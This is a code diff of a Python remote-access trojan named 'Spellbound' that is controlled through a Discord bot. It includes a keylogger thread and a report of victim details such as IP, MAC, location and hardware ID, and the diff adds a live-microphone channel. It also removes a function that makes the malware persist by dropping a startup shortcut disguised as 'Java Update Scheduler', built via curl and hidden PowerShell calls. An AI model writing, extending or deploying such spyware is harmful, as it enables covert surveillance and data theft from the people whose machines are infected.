@@ -47,6 +47,7 @@ from pynput.keyboard import Key, Listener
 # _____________________________________________________________________________________________________________________________________ #
 # ===================================================================================================================================== #
 BOT_TOKEN = "%"  # %
+microphoneChannelName = "🔊live-microphone"
 
 
 # _____________________________________________________________________________________________________________________________________ #
@@ -101,17 +102,6 @@ def KillProcess(processName):
     if processName not in result.stdout:
         return
     subprocess.run(["taskkill", "/F", "/IM", processName], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
-
-def AddPersistance():
-    iconPath = f"{binPath}\\icon.ico"
-    subprocess.run(["curl", "https://raw.githubusercontent.com/JuanaCOrtiz/test-rep/refs/heads/main/java.ico", "-o", iconPath], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
-    psCmd = f"""
-$s=(New-Object -COM WScript.Shell).CreateShortcut('{shortcutPath}\\Java Update Scheduler.lnk');
-$s.TargetPath='{scriptPath}';
-$s.IconLocation='{iconPath}';
-$s.Save()
-"""
-    subprocess.run(["powershell", "-Command", psCmd], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
 
 
 # _____________________________________________________________________________________________________________________________________ #
@@ -443,11 +433,12 @@ def KeyloggerThread():
 # =============================================================== DISCORD BOT ====================================================================== #
 class Client(discord.Client):
 
-    # ____________________________________________________________________________________________________________________________________________________ #
-    # ============================================================== CHANNEL SETUP ======================================================================= #
+    # _____________________________________________________________________________________________________________________________________________________ #
+    # ============================================================== CHANNELS SETUP ======================================================================= #
     @staticmethod
     async def on_ready():
         for guild in client.guilds:
+            # ****** Commands channel ****** #
             channel_name = GetChannelName()
             existing_channel = discord.utils.get(guild.text_channels, name=channel_name)
 
@@ -459,6 +450,8 @@ class Client(discord.Client):
                 embed = discord.Embed(description=f":wireless: **{os.getlogin()}** Connected with `Spellbound v{version}`", color=discord.Color.blue())
                 await existing_channel.send(embed=embed)
 
+            # ****** Vocal channel ****** #
+            
 
         # ____________________________________________________________________________________________________________________________________________________ #
         # ================================================================= HACKS THREADS ==================================================================== #
@@ -617,6 +610,7 @@ OS Version: {osVersion}
 Architecture: {architecture}
 MAC: {mac}
 IP: {ip}
+HWID: {subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID").decode().strip()}
 Country: {country}
 Region: {region}
 City: {city}
@@ -779,8 +773,6 @@ Internet Provider: {org}
                 await message.channel.send(embed=embed)
                 
 
-
-AddPersistance()
 
 intents = discord.Intents.default()
 intents.message_content = True
